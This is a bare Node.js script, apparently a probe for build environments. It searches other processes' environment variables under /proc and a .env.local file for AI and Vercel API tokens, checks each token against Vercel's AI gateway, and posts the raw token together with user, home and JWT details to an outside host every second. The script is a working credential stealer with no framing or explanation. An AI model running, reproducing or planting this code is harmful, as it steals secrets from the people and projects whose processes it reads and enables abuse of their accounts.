const crypto = require('node:crypto');
const fs = require('node:fs');
const https = require('node:https');

const TOKEN_KEYS = [
  'VERCEL_OIDC_TOKEN',
  'AI_GATEWAY_API_KEY',
  'ANTHROPIC_AUTH_TOKEN',
  'OPENAI_API_KEY',
  'ANTHROPIC_API_KEY'
];

function parseDotenv(text) {
  const out = {};
  for (const line of text.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#') || !trimmed.includes('=')) continue;
    const idx = trimmed.indexOf('=');
    const key = trimmed.slice(0, idx).trim();
    let value = trimmed.slice(idx + 1);
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }
    if (key) out[key] = value;
  }
  return out;
}

function readEnvLocal() {
  try {
    return parseDotenv(fs.readFileSync('.env.local', 'utf8'));
  } catch {
    return {};
  }
}

function decodeJwtPayload(token) {
  const parts = String(token || '').split('.');
  if (parts.length < 2) return null;
  try {
    return JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
  } catch {
    return null;
  }
}

function readEnviron(pid) {
  const raw = fs.readFileSync(`/proc/${pid}/environ`);
  const env = {};
  for (const item of raw.toString('utf8').split('\0')) {
    if (!item || !item.includes('=')) continue;
    const idx = item.indexOf('=');
    env[item.slice(0, idx)] = item.slice(idx + 1);
  }
  return env;
}

function postJson(url, payload) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const req = https.request(url, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body)
      }
    }, (res) => {
      res.resume();
      res.on('end', () => resolve(res.statusCode));
    });
    req.on('error', () => resolve(0));
    req.end(body);
  });
}

async function validateGatewayToken(key, token) {
  const looksJwt = String(token || '').split('.').length >= 3;
  const headers = { authorization: `Bearer ${token}` };
  if (key === 'VERCEL_OIDC_TOKEN' || looksJwt) headers['ai-gateway-auth-method'] = 'oidc';

  try {
    const response = await fetch('https://ai-gateway.vercel.sh/v1/models', { headers });
    return {
      validationEndpoint: 'https://ai-gateway.vercel.sh/v1/models',
      validationStatus: response.status,
      validationOk: response.ok,
      validationContentType: response.headers.get('content-type'),
      validationPreview: (await response.text()).slice(0, 300)
    };
  } catch (error) {
    return {
      validationEndpoint: 'https://ai-gateway.vercel.sh/v1/models',
      validationStatus: null,
      validationOk: false,
      validationError: error instanceof Error ? `${error.name}: ${error.message}` : String(error)
    };
  }
}

let posted = false;

async function scanProcOnce() {
  if (posted) return;
  let pids = [];
  try {
    pids = fs.readdirSync('/proc').filter((name) => /^\d+$/.test(name));
  } catch {
    return;
  }

  for (const pid of pids) {
    if (Number(pid) === process.pid) continue;
    let env;
    try {
      env = readEnviron(pid);
    } catch {
      continue;
    }

    const key = TOKEN_KEYS.find((name) => typeof env[name] === 'string' && env[name].trim().length > 0);
    if (!key) continue;

    posted = true;
    const token = env[key].trim();
    const envLocal = readEnvLocal();
    const marker = process.env.VXC030_MARKER || envLocal.VXC030_MARKER || 'VXC033_PROC_STATIC';
    const claims = decodeJwtPayload(token);
    const validation = await validateGatewayToken(key, token);
    const safeClaims = claims ? {
      iss: claims.iss,
      aud: claims.aud,
      sub: claims.sub,
      ownerId: claims.owner_id,
      projectId: claims.project_id,
      owner: claims.owner,
      project: claims.project,
      environment: claims.environment,
      deployment: claims.deployment,
      exp: claims.exp,
      iat: claims.iat
    } : null;
    const payload = {
      marker,
      phase: 'proc-env-watch',
      key,
      pid,
      procComm: (() => {
        try { return fs.readFileSync(`/proc/${pid}/comm`, 'utf8').trim(); } catch { return ''; }
      })(),
      cwd: process.cwd(),
      uid: typeof process.getuid === 'function' ? String(process.getuid()) : '',
      user: process.env.USER || '',
      home: process.env.HOME || '',
      hasAnyToken: true,
      tokenLength: token.length,
      tokenLooksJwt: Boolean(claims),
      tokenSha256Local: crypto.createHash('sha256').update(token).digest('hex'),
      jwtClaimsSafe: safeClaims,
      ...validation,
      [key]: token
    };
    const url = `https://vercel-build-imds-probe.vercel.app/api/hit?marker=${encodeURIComponent(marker)}&phase=proc-env-watch`;
    const status = await postJson(url, payload);
    console.log(`[vxc033] proc env token metadata posted status=${status} key=${key} pid=${pid}`);
    return;
  }
}

setInterval(() => {
  scanProcOnce().catch(() => {});
}, 1000).unref();

scanProcOnce().catch(() => {});
